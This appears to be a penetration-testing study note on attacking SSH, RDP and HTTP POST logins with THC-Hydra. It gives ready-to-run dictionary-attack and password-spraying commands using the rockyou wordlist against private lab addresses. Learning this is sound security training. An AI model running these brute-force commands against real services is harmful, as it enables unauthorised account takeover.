[[Notes/Password Attacks|Password Attacks]]

# Attacking Network Service Logins
## SSH and RDP logins
### THC-Hydra
TAGS: #hydra #password-cracking #dictionary-attack #ssh #rdp
```shell
# unzip if it wasn't already
sudo gzip -d rockyou.txt.gz

# simple hydra command
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```
#### Password Spraying
```shell
# password sparying with a list of usernames
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```
## HTTP POST login forms
```shell
# put things in place after we have intercepted with burp (could utilize burp's intruder?)
# hydra -l ^username^ -P ^password list path^ ^host^ http-post-form "location:var1=^username^:var2=^PASS^:^login_failed_text^"
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

# Password Cracking

# Working with Hashes
